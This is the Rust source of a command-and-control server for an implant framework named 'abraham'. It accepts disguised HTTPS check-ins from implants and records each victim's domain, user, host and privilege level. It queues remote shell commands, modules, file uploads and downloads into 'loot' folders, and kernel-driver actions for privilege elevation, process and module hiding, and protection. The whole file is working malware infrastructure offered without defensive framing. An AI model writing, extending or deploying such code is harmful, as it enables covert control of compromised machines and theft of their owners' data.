use abraham_common::crypto::{self, ClientHello, Session};
use abraham_common::frame::open_frames;
use abraham_common::http::{read_request, write_response};
use abraham_common::message::{
    self, driver_action, msg, Chunk, Message, RegisterInfo, Task, TaskBody, TaskResult,
};
use abraham_common::profile::{Profile, DEFAULT_PROFILE_PATH};
use ed25519_dalek::SigningKey;
use rand_core::OsRng;
use serde_json::{json, Value};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::io::{AsyncBufReadExt, AsyncRead, AsyncWrite, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc, RwLock};
use tokio_rustls::rustls::pki_types::{CertificateDer, PrivateKeyDer};
use tokio_rustls::TlsAcceptor;

const C2_DEFAULT: &str = "0.0.0.0:8443";
const MGMT_DEFAULT: &str = "127.0.0.1:9000";
const KEY_DEFAULT: &str = "server.key";
const PROFILE_DEFAULT: &str = DEFAULT_PROFILE_PATH;
const CERT_DEFAULT: &str = "server-cert.pem";
const TLSKEY_DEFAULT: &str = "server-tls-key.pem";
const CHUNK_SIZE: usize = 60_000;
const MAX_BODY: usize = 8 * 1024 * 1024;

struct StoredResult {
    task_id: u32,
    kind: String,
    status: u8,
    summary: String,
    timestamp: u64,
}

struct SessionHandle {
    info: RegisterInfo,
    addr: String,
    last_seen: u64,
    queue: mpsc::UnboundedSender<Message>,
    results: Arc<RwLock<Vec<StoredResult>>>,
}

struct AppState {
    sessions: RwLock<HashMap<u32, SessionHandle>>,
    next_session_id: AtomicU32,
    next_task_id: AtomicU32,
    signing_key: SigningKey,
}

fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn arg_or(flag: &str, default: &str) -> String {
    let args: Vec<String> = std::env::args().collect();
    args.iter()
        .position(|a| a == flag)
        .and_then(|i| args.get(i + 1))
        .cloned()
        .unwrap_or_else(|| default.to_string())
}

fn load_or_create_key(path: &Path) -> anyhow::Result<SigningKey> {
    if path.exists() {
        let seed = std::fs::read(path)?;
        let seed: [u8; 32] = seed.as_slice().try_into()?;
        Ok(SigningKey::from_bytes(&seed))
    } else {
        let key = SigningKey::generate(&mut OsRng);
        std::fs::write(path, key.to_bytes())?;
        Ok(key)
    }
}

fn load_tls_pair(
    cert_path: &Path,
    key_path: &Path,
) -> anyhow::Result<(Vec<CertificateDer<'static>>, PrivateKeyDer<'static>)> {
    if cert_path.exists() && key_path.exists() {
        let cert_pem = std::fs::read(cert_path)?;
        let key_pem = std::fs::read(key_path)?;
        let mut certs = Vec::new();
        for cert in rustls_pemfile::certs(&mut cert_pem.as_slice()) {
            certs.push(cert?);
        }
        let key = rustls_pemfile::private_key(&mut key_pem.as_slice())?
            .ok_or_else(|| anyhow::anyhow!("no private key in {}", key_path.display()))?;
        Ok((certs, key))
    } else {
        let generated = rcgen::generate_simple_self_signed(vec!["abraham".to_string()])?;
        std::fs::write(cert_path, generated.cert.pem())?;
        std::fs::write(key_path, generated.key_pair.serialize_pem())?;
        let certs = vec![generated.cert.der().clone()];
        let key = PrivateKeyDer::Pkcs8(generated.key_pair.serialize_der().into());
        Ok((certs, key))
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let c2_addr = arg_or("--listen", C2_DEFAULT);
    let mgmt_addr = arg_or("--mgmt", MGMT_DEFAULT);
    let key_path = PathBuf::from(arg_or("--key", KEY_DEFAULT));
    let profile_path = PathBuf::from(arg_or("--profile", PROFILE_DEFAULT));
    let cert_path = PathBuf::from(arg_or("--tls-cert", CERT_DEFAULT));
    let tlskey_path = PathBuf::from(arg_or("--tls-key", TLSKEY_DEFAULT));

    let profile = if profile_path.exists() {
        Profile::load_file(&profile_path).map_err(anyhow::Error::msg)?
    } else {
        eprintln!(
            "[!] profile {} not found, using built-in defaults",
            profile_path.display()
        );
        Profile::default()
    };

    let signing_key = load_or_create_key(&key_path)?;
    let pub_path = key_path.with_extension("pub");
    std::fs::write(
        &pub_path,
        hex::encode(signing_key.verifying_key().as_bytes()),
    )?;
    println!(
        "[*] server identity: {}",
        hex::encode(signing_key.verifying_key().as_bytes())
    );
    println!(
        "[*] identity persisted at {} / {}",
        key_path.display(),
        pub_path.display()
    );

    let (certs, key) = load_tls_pair(&cert_path, &tlskey_path)?;
    let pin = Sha256::digest(certs[0].as_ref());
    println!("[*] tls cert sha256: {}", hex::encode(pin));
    let tls_config = tokio_rustls::rustls::ServerConfig::builder()
        .with_no_client_auth()
        .with_single_cert(certs, key)?;
    let acceptor = TlsAcceptor::from(Arc::new(tls_config));

    let state = Arc::new(AppState {
        sessions: RwLock::new(HashMap::new()),
        next_session_id: AtomicU32::new(1),
        next_task_id: AtomicU32::new(1),
        signing_key,
    });

    let c2 = TcpListener::bind(&c2_addr).await?;
    println!("[*] c2 (https) listening on {c2_addr}");
    let mgmt = TcpListener::bind(&mgmt_addr).await?;
    println!("[*] mgmt listening on {mgmt_addr}");

    let c2_state = state.clone();
    let c2_acceptor = acceptor.clone();
    let c2_profile = profile.clone();
    tokio::spawn(async move {
        loop {
            if let Ok((stream, peer)) = c2.accept().await {
                let state = c2_state.clone();
                let acceptor = c2_acceptor.clone();
                let profile = c2_profile.clone();
                tokio::spawn(async move {
                    let tls_stream = match acceptor.accept(stream).await {
                        Ok(s) => s,
                        Err(e) => {
                            eprintln!("[!] tls handshake with {peer} failed: {e}");
                            return;
                        }
                    };
                    if let Err(e) = run_session(tls_stream, peer, state, profile).await {
                        eprintln!("[!] session {peer} ended: {e}");
                    }
                });
            }
        }
    });

    loop {
        let (stream, _) = mgmt.accept().await?;
        let state = state.clone();
        tokio::spawn(async move {
            if let Err(e) = run_mgmt(stream, state).await {
                eprintln!("[!] mgmt client ended: {e}");
            }
        });
    }
}

fn reject_status(method: &str) -> u16 {
    if method == "POST" {
        404
    } else {
        405
    }
}

fn request_allowed(method: &str, uri: &str, profile: &Profile) -> bool {
    method == "POST" && profile.uris.iter().any(|allowed| allowed == uri)
}

async fn run_session<S: AsyncRead + AsyncWrite + Unpin>(
    mut stream: S,
    peer: SocketAddr,
    state: Arc<AppState>,
    profile: Profile,
) -> Result<(), anyhow::Error> {
    let Some(mut session) = handshake(&mut stream, &state, &profile).await? else {
        return Ok(());
    };
    let Some((session_id, rx, results)) =
        await_register(&mut stream, &mut session, peer, &state, &profile).await?
    else {
        return Ok(());
    };
    let mut established = Established {
        session,
        session_id,
        rx,
        results,
        pending_downloads: HashMap::new(),
    };
    let result = established_loop(&mut stream, &mut established, &state, &profile).await;
    state.sessions.write().await.remove(&session_id);
    println!("[-] session {} removed", established.session_id);
    result
}

struct Established {
    session: Session,
    session_id: u32,
    rx: mpsc::UnboundedReceiver<Message>,
    results: Arc<RwLock<Vec<StoredResult>>>,
    pending_downloads: HashMap<u32, Vec<u8>>,
}

/// First request on a connection carries the raw 64-byte ClientHello; the
/// response body carries the raw 128-byte ServerHello.
async fn handshake<S: AsyncRead + AsyncWrite + Unpin>(
    stream: &mut S,
    state: &Arc<AppState>,
    profile: &Profile,
) -> Result<Option<Session>, anyhow::Error> {
    loop {
        let Some(req) = read_request(stream).await? else {
            return Ok(None);
        };
        if !request_allowed(&req.method, &req.uri, profile) {
            let status = reject_status(&req.method);
            write_response(stream, status, &profile.server_header, b"").await?;
            continue;
        }
        if req.body.len() != crypto::CLIENT_HELLO_LEN {
            write_response(stream, 400, &profile.server_header, b"").await?;
            anyhow::bail!(
                "handshake: expected {} bytes, got {}",
                crypto::CLIENT_HELLO_LEN,
                req.body.len()
            );
        }
        let raw: [u8; crypto::CLIENT_HELLO_LEN] = req.body.as_slice().try_into()?;
        let client_hello = ClientHello::from_bytes(&raw);
        let (secret, server_hello) = crypto::server_respond(&state.signing_key, &client_hello);
        write_response(
            stream,
            200,
            &profile.server_header,
            &server_hello.to_bytes(),
        )
        .await?;
        return Ok(Some(crypto::server_finish(
            secret,
            &client_hello,
            &server_hello,
        )));
    }
}

async fn await_register<S: AsyncRead + AsyncWrite + Unpin>(
    stream: &mut S,
    session: &mut Session,
    peer: SocketAddr,
    state: &Arc<AppState>,
    profile: &Profile,
) -> Result<
    Option<(
        u32,
        mpsc::UnboundedReceiver<Message>,
        Arc<RwLock<Vec<StoredResult>>>,
    )>,
    anyhow::Error,
> {
    loop {
        let Some(req) = read_request(stream).await? else {
            return Ok(None);
        };
        if !request_allowed(&req.method, &req.uri, profile) {
            let status = reject_status(&req.method);
            write_response(stream, status, &profile.server_header, b"").await?;
            continue;
        }
        let frames = match open_frames(&req.body, session) {
            Ok(frames) => frames,
            Err(e) => {
                write_response(stream, 400, &profile.server_header, b"").await?;
                anyhow::bail!("register: bad frames: {e}");
            }
        };
        if frames.len() != 1 || frames[0].0 != msg::REGISTER {
            write_response(stream, 400, &profile.server_header, b"").await?;
            anyhow::bail!("register: expected a single REGISTER frame");
        }
        let Message::Register(info) = Message::decode(msg::REGISTER, &frames[0].1)? else {
            anyhow::bail!("register: undecodable REGISTER frame");
        };
        let session_id = state.next_session_id.fetch_add(1, Ordering::SeqCst);
        let (tx, rx) = mpsc::unbounded_channel::<Message>();
        let results = Arc::new(RwLock::new(Vec::<StoredResult>::new()));
        state.sessions.write().await.insert(
            session_id,
            SessionHandle {
                info: info.clone(),
                addr: peer.to_string(),
                last_seen: now(),
                queue: tx,
                results: results.clone(),
            },
        );
        println!(
            "[+] session {session_id}: {}\\{}@{} from {} (implant {})",
            info.domain, info.username, info.hostname, peer, info.implant_version
        );
        write_response(stream, 200, &profile.server_header, b"").await?;
        return Ok(Some((session_id, rx, results)));
    }
}

async fn established_loop<S: AsyncRead + AsyncWrite + Unpin>(
    stream: &mut S,
    established: &mut Established,
    state: &Arc<AppState>,
    profile: &Profile,
) -> Result<(), anyhow::Error> {
    let session_id = established.session_id;
    loop {
        let Some(req) = read_request(stream).await? else {
            return Ok(());
        };
        if !request_allowed(&req.method, &req.uri, profile) {
            let status = reject_status(&req.method);
            write_response(stream, status, &profile.server_header, b"").await?;
            continue;
        }
        if req.body.len() > MAX_BODY {
            write_response(stream, 413, &profile.server_header, b"").await?;
            anyhow::bail!("request body {} exceeds limit", req.body.len());
        }
        let session = &mut established.session;
        let frames = match open_frames(&req.body, session) {
            Ok(frames) => frames,
            Err(e) => {
                write_response(stream, 400, &profile.server_header, b"").await?;
                anyhow::bail!("session {session_id}: bad frames: {e}");
            }
        };
        let mut response: Vec<u8> = Vec::new();
        for (msg_type, payload) in frames {
            match msg_type {
                msg::TASK_POLL => {
                    if let Some(handle) = state.sessions.write().await.get_mut(&session_id) {
                        handle.last_seen = now();
                    }
                    while let Ok(outbound) = established.rx.try_recv() {
                        let (mt, body) = outbound.encode();
                        response.extend_from_slice(&session.seal(mt, &body)?);
                    }
                    let (mt, body) = Message::BatchEnd.encode();
                    response.extend_from_slice(&session.seal(mt, &body)?);
                }
                msg::RESULT => {
                    if let Message::TaskResult(result) = Message::decode(msg_type, &payload)? {
                        store_task_result(&established.results, result).await;
                    }
                }
                msg::CHUNK => {
                    if let Message::Chunk(chunk) = Message::decode(msg_type, &payload)? {
                        let ack = handle_download_chunk(
                            established.session_id,
                            &mut established.pending_downloads,
                            chunk,
                            &established.results,
                        )
                        .await?;
                        if let Some((mt, body)) = ack {
                            let frame = session.seal(mt, &body)?;
                            response.extend_from_slice(&frame);
                        }
                    }
                }
                msg::PING => {
                    let (mt, body) = Message::Pong.encode();
                    response.extend_from_slice(&session.seal(mt, &body)?);
                }
                msg::ERROR => {
                    if let Message::Error { code, message } = Message::decode(msg_type, &payload)? {
                        eprintln!("[!] implant reported error {code}: {message}");
                    }
                }
                _ => {}
            }
        }
        write_response(stream, 200, &profile.server_header, &response).await?;
    }
}

async fn store_task_result(results: &Arc<RwLock<Vec<StoredResult>>>, result: TaskResult) {
    let summary = match String::from_utf8(result.data.clone()) {
        Ok(text) => {
            let text = text.replace(['\r', '\n'], " ");
            if text.len() > 200 {
                format!("{}...", &text[..200])
            } else {
                text
            }
        }
        Err(_) => format!("<{} bytes>", result.data.len()),
    };
    results.write().await.push(StoredResult {
        task_id: result.id,
        kind: "task".into(),
        status: result.status,
        summary,
        timestamp: now(),
    });
}

/// Buffers a download chunk; once the last chunk lands the loot file is
/// written and a TaskResult ack message is returned for the response body.
async fn handle_download_chunk(
    session_id: u32,
    pending: &mut HashMap<u32, Vec<u8>>,
    chunk: Chunk,
    results: &Arc<RwLock<Vec<StoredResult>>>,
) -> anyhow::Result<Option<(u8, Vec<u8>)>> {
    let entry = pending.entry(chunk.task_id).or_default();
    entry.extend_from_slice(&chunk.data);
    if !chunk.last {
        return Ok(None);
    }
    let data = pending.remove(&chunk.task_id).unwrap_or_default();
    let dir = PathBuf::from(format!("loot/session-{session_id}"));
    tokio::fs::create_dir_all(&dir).await?;
    let path = dir.join(format!("task-{}.bin", chunk.task_id));
    tokio::fs::write(&path, &data).await?;
    results.write().await.push(StoredResult {
        task_id: chunk.task_id,
        kind: "download".into(),
        status: message::STATUS_OK,
        summary: format!("{} ({} bytes)", path.display(), data.len()),
        timestamp: now(),
    });
    let ack = Message::TaskResult(TaskResult {
        id: chunk.task_id,
        status: message::STATUS_OK,
        data: path.to_string_lossy().as_bytes().to_vec(),
    });
    let (mt, body) = ack.encode();
    Ok(Some((mt, body)))
}

async fn run_mgmt(stream: TcpStream, state: Arc<AppState>) -> anyhow::Result<()> {
    stream.set_nodelay(true)?;
    let (rd, mut wr) = stream.into_split();
    let mut lines = BufReader::new(rd).lines();
    while let Some(line) = lines.next_line().await? {
        let response = match serde_json::from_str::<Value>(&line) {
            Err(e) => json!({ "error": format!("invalid json: {e}") }),
            Ok(request) => handle_mgmt(request, &state).await,
        };
        wr.write_all(serde_json::to_string(&response)?.as_bytes())
            .await?;
        wr.write_all(b"\n").await?;
    }
    Ok(())
}

async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
    let cmd = request
        .get("cmd")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    match cmd.as_str() {
        "sessions" => list_sessions(state).await,
        "shell" => {
            let command = request
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            queue_task(state, &request, TaskBody::Shell { command }).await
        }
        "module" => {
            let name = request
                .get("name")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let args = request
                .get("args")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if name.is_empty() {
                return json!({ "error": "module requires name" });
            }
            queue_task(state, &request, TaskBody::Module { name, args }).await
        }
        "driver" => {
            let action = match request.get("action").and_then(|v| v.as_str()) {
                Some("load") => driver_action::LOAD,
                Some("unload") => driver_action::UNLOAD,
                Some("probe") => driver_action::PROBE,
                Some("elevate") => driver_action::ELEVATE,
                Some("gate") => driver_action::GATE,
                Some("hide") => driver_action::HIDE,
                Some("unhide") => driver_action::UNHIDE,
                Some("call") => driver_action::CALL,
                Some("call-preflight") => driver_action::CALL_PREFLIGHT,
                Some("map") => driver_action::MAP,
                Some("modhide") => driver_action::MODHIDE,
                Some("modshow") => driver_action::MODSHOW,
                Some("protect") => driver_action::PROTECT,
                Some("chan") => driver_action::CHAN,
                _ => {
                    return json!({ "error": "driver action must be load, unload, probe, elevate, gate, hide, unhide, call-preflight, call, map, modhide, modshow, protect or chan" });
                }
            };
            let service = request
                .get("service")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if service.is_empty()
                && !matches!(
                    action,
                    driver_action::PROBE
                        | driver_action::ELEVATE
                        | driver_action::GATE
                        | driver_action::HIDE
                        | driver_action::UNHIDE
                        | driver_action::CALL
                        | driver_action::CALL_PREFLIGHT
                        | driver_action::MAP
                        | driver_action::MODHIDE
                        | driver_action::MODSHOW
                        | driver_action::PROTECT
                        | driver_action::CHAN
                )
            {
                return json!({ "error": "driver requires service" });
            }
            let source = request
                .get("source")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let drop_path = request
                .get("drop_path")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            queue_task(
                state,
                &request,
                TaskBody::Driver {
                    action,
                    service,
                    source,
                    drop_path,
                },
            )
            .await
        }
        "upload" => {
            let local = request
                .get("local")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            let remote = request
                .get("remote")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            if local.is_empty() || remote.is_empty() {
                return json!({ "error": "upload requires local and remote" });
            }
            match tokio::fs::read(&local).await {
                Err(e) => json!({ "error": format!("cannot read {local}: {e}") }),
                Ok(data) => queue_upload(state, &request, remote, data).await,
            }
        }
        "download" => {
            let path = request
                .get("path")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();
            queue_task(state, &request, TaskBody::Download { path }).await
        }
        "sleep" => {
            let secs = request.get("secs").and_then(|v| v.as_u64()).unwrap_or(30);
            let jitter = request
                .get("jitter")
                .and_then(|v| v.as_f64())
                .unwrap_or(0.25) as f32;
            queue_task(state, &request, TaskBody::Sleep { secs, jitter }).await
        }
        "exit" => queue_task(state, &request, TaskBody::Exit).await,
        "results" => list_results(state, &request).await,
        _ => json!({ "error": "unknown command" }),
    }
}

fn session_id_of(request: &Value) -> Option<u32> {
    request
        .get("session")
        .and_then(|v| v.as_u64())
        .and_then(|v| u32::try_from(v).ok())
}

async fn queue_task(state: &Arc<AppState>, request: &Value, body: TaskBody) -> Value {
    let Some(session_id) = session_id_of(request) else {
        return json!({ "error": "session is required" });
    };
    let sessions = state.sessions.read().await;
    let Some(handle) = sessions.get(&session_id) else {
        return json!({ "error": "unknown session" });
    };
    let task_id = state.next_task_id.fetch_add(1, Ordering::SeqCst);
    match handle.queue.send(Message::Task(Task { id: task_id, body })) {
        Ok(()) => json!({ "queued": task_id }),
        Err(_) => json!({ "error": "session is gone" }),
    }
}

async fn queue_upload(
    state: &Arc<AppState>,
    request: &Value,
    remote: String,
    data: Vec<u8>,
) -> Value {
    let Some(session_id) = session_id_of(request) else {
        return json!({ "error": "session is required" });
    };
    let sessions = state.sessions.read().await;
    let Some(handle) = sessions.get(&session_id) else {
        return json!({ "error": "unknown session" });
    };
    let task_id = state.next_task_id.fetch_add(1, Ordering::SeqCst);
    let task = Message::Task(Task {
        id: task_id,
        body: TaskBody::Upload { path: remote },
    });
    if handle.queue.send(task).is_err() {
        return json!({ "error": "session is gone" });
    }
    let total = data.len().div_ceil(CHUNK_SIZE).max(1);
    for (seq, part) in data.chunks(CHUNK_SIZE).enumerate() {
        let chunk = Message::Chunk(Chunk {
            task_id,
            seq: seq as u32,
            data: part.to_vec(),
            last: seq + 1 == total,
        });
        if handle.queue.send(chunk).is_err() {
            return json!({ "error": "session is gone" });
        }
    }
    json!({ "queued": task_id, "bytes": data.len() })
}

async fn list_sessions(state: &Arc<AppState>) -> Value {
    let sessions = state.sessions.read().await;
    let mut ids: Vec<&u32> = sessions.keys().collect();
    ids.sort();
    let list: Vec<Value> = ids
        .iter()
        .map(|id| {
            let h = &sessions[*id];
            json!({
                "id": id,
                "user": format!("{}\\{}", h.info.domain, h.info.username),
                "hostname": h.info.hostname,
                "pid": h.info.pid,
                "arch": if h.info.arch == message::ARCH_X64 { "x64" } else { "arm64" },
                "integrity_level": h.info.integrity_level,
                "addr": h.addr,
                "last_seen": h.last_seen,
                "implant_version": h.info.implant_version,
            })
        })
        .collect();
    json!({ "sessions": list })
}

async fn list_results(state: &Arc<AppState>, request: &Value) -> Value {
    let Some(session_id) = session_id_of(request) else {
        return json!({ "error": "session is required" });
    };
    let sessions = state.sessions.read().await;
    let Some(handle) = sessions.get(&session_id) else {
        return json!({ "error": "unknown session" });
    };
    let limit = request.get("limit").and_then(|v| v.as_u64()).unwrap_or(20) as usize;
    let results = handle.results.read().await;
    let list: Vec<Value> = results
        .iter()
        .rev()
        .take(limit)
        .map(|r| {
            json!({
                "task_id": r.task_id,
                "kind": r.kind,
                "status": r.status,
                "summary": r.summary,
                "timestamp": r.timestamp,
            })
        })
        .collect();
    json!({ "results": list })
}
